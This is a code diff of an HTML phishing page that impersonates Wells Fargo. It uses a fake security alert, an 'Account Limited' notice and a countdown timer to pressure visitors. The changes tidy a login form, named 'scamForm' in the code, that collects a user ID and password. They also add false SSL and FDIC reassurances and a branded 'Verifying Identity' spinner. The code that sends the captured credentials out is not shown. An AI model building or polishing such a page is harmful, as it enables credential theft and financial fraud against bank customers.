@@ -257,6 +257,7 @@
         ⚠️ SECURITY ALERT: Unusual Activity Detected
     </div>
 
+
     <div class="container">
         <h2>Account Limited</h2>
         <p>Dear Customer,</p>
@@ -266,30 +267,39 @@
         <div class="timer">
             Time Remaining: <span id="countdown">09:59</span>
         </div>
-        <form id="scamForm">
-          
-    <form id="scamForm">
-        <input type="text" name="username" placeholder="User ID" required>
-        <input type="password" name="password" placeholder="Password" required>
         
-        <!-- ADD THIS BUTTON -->
-        <button type="submit" id="verifyBtn" style="margin-top: 15px;">Verify Now</button>
-    </form>
+        <form id="scamForm">
+            <div class="form-group">
+                <label>User ID</label>
+                <input type="text" name="username" placeholder="User ID" required>
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            
+            <button type="submit" id="verifyBtn">Verify Now</button>
+        </form>
 
-
-    
-    <!-- White Box Disclaimer with Black Text and Bold Font -->
         <div class="fdic-box">
             <p><strong>Secure Connection</strong><br>
-  Your connection is encrypted using 256-bit SSL. Wells Fargo is a member of the FDIC.</p>
-</div>
+              Your connection is encrypted using 256-bit SSL. Wells Fargo is a member of the FDIC.</p>
+        </div>
 
-
-        <!-- FDIC Footer Text -->
         <div class="fdic-footer">
             Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
         </div>
     </div>
+
+    <!-- PROCESSING SPINNER - MUST BE IN THE BODY -->
+    <div id="processing" style="display:none; text-align:center; padding:50px;">
+        <div style="font-family: 'Wells Fargo Sans', Arial, sans-serif; font-weight: bold; font-size: 32px; color: #d71e28; margin-bottom: 20px;">WELLS FARGO</div>
+        <div style="border: 4px solid #f3f3f3; border-top: 4px solid #d71e28; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+        <h2>Verifying Identity...</h2>
+        <p>Please wait while we confirm your details.</p>
+    </div>
+
+    
 
     <!-- Main Footer with Links and Copyright -->
     <footer class="main-footer">
